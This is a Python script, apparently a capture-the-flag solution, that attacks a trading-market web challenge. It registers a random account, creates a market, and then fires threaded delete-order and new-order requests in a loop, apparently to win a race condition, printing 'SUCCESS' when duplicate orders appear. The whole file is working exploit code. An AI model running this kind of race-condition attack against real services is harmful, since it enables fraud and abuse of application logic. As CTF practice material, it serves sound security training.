import sys
import requests
from time import sleep
from threading import Thread
import string
import random
from bs4 import BeautifulSoup

URL = "http://mktrace.ctf.offdef.it"
# asdf
# ffas
s = requests.Session()

def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def register(user, password):
    target = '{}/register'.format(URL)
    data = {
        "username": user,
        "password": password
    }
    r = requests.post(target, data=data)
    #print(r)


def login(user, password):
    target = '{}/login'.format(URL)
    data = {
        "username": user,
        "password": password
    }
    r = s.post(target, data=data)
    #print(r)

def new_market(n, p):
    target = '{}/new_market'.format(URL)
    data = {
        "name": n,
        "password": p
    }
    r = s.post(target, data=data)
    #print(r)

def market_del():
    target = '{}/market'.format(URL)
    r = s.get(target)
    #print(r)
    soup = BeautifulSoup(r.text, 'html.parser')
    ids = [tag.get_text(strip=True) for tag in soup.select('th')][7::]
    print(ids)
    return ids

def del_order(id):
    target = '{}/delete_order/{}'.format(URL, id)
    r = s.get(target)
    #print(r.text)

def new_order():
    target = '{}/new_order'.format(URL)
    data = {
        "euro": "1",
        "coins": "100",
        "buy": "sell"
    }
    r = s.post(target, data=data)
    #print(r.text)

def attacker(u,p):
    ids = market_del()
    for i in ids:
        del_order(i)
    new_order()

    print(ids)
    if len(ids) > 1:
        print("SUCCESS", user, password)
        sys.exit(0)

s = requests.Session()
user = id_generator()
password = id_generator()

mn = id_generator()
mp = id_generator()

register(user, password)
login(user, password)
new_market(mn, mp)
ids = market_del()
del_order(ids[0])

while True:
    t1 = Thread(target=attacker, args=(user, password))
    t2 = Thread(target=attacker, args=(user, password))
    t3 = Thread(target=attacker, args=(user, password))
    t1.start()
    t2.start()
    t3.start()

    sleep(.05)
